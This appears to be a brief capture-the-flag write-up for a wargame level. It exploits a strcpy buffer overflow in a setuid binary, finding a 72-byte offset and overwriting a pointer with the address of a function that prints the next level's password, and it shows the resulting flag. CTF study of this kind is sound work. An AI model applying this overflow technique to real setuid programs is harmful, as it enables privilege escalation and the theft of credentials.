@@ -1,0 +1,52 @@
+ll
+|
+L-> -rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6*
+
+./level6
+
+segfault
+
+./level6 a
+|
+L-> Nope
+
+ok so this program takes an argument
+
+when we objdump on it we see main() m() and n()
+
+the main take the args and strcpy it, so we can buffer overflow on it, then it implicitly call m() to fwrite Nope
+the n() do a system("cat /home/user/level7/.pass")
+
+so we need to find the address of n(), with gdb we found 0x8048454
+
+noow we need to find where it segfault
+
+./level6 $(python -c 'print "a"*100')
+segfault
+
+./level6 $(python -c 'print "a"*50')
+Nope
+
+./level6 $(python -c 'print "a"*75')
+segfault
+
+./level6 $(python -c 'print "a"*65')
+Nope
+
+./level6 $(python -c 'print "a"*70')
+Nope
+
+./level6 $(python -c 'print "a"*71')
+Nope
+
+./level6 $(python -c 'print "a"*72')
+segfault here it is
+
+no we can add the address of n()
+
+./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
+|
+L-> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+here is the flag
+
